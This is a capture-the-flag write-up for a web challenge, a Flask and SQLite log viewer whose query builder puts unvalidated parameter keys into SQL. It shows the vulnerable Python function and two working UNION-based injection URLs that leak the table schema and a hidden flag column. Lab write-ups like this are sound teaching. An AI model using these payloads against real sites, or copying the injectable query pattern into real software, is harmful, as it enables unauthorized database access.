Web: logfilter3000
------------------

Challenge description:


```
I made this really cool log-viewer application! I used an ORM so its SUPER secure.

challenges.openctf.cat:9008
```

We were given the source code of a small log-viewer. The application is written in Python. It uses the Flask framework and SQLite as a database. The supplied source code was incomplete and didn't work out of the box. Some of the code was missing. While trying to get the application to run locally we noticed a SQL injection issue:

```python
def format_where(self, safe=True):
    where_fmts = []
    for key, val in self._where.items():
        if safe: 
            where_fmts.append("{} = ?".format(key))
        else:
            where_fmts.append("{} = {}".format(key, repr(val)))

    if where_fmts:
        return " WHERE " + " AND ".join(where_fmts)
    return ""
```

The `key` variable is not verified and we can inject into the SQL query.

We leaked the table schema and noticed a hidden field:

```sql
http://challenges.openctf.cat:9008/?sev=999&1 union select 1,2,3,sql from sqlite_master where 'null' =null

CREATE TABLE log_entry ( id INTEGER PRIMARY KEY, sev INTEGER, message TEXT, type TEXT, time INTEGER, hidden TEXT )
```

To leak the flag:

```
http://challenges.openctf.cat:9008/?sev=999&1 union select 1,hidden,3,%274%27 from log_entry where 'null' =null

flag{th3_k37_t0_g00d_sq1_1nj3ti0n}
```
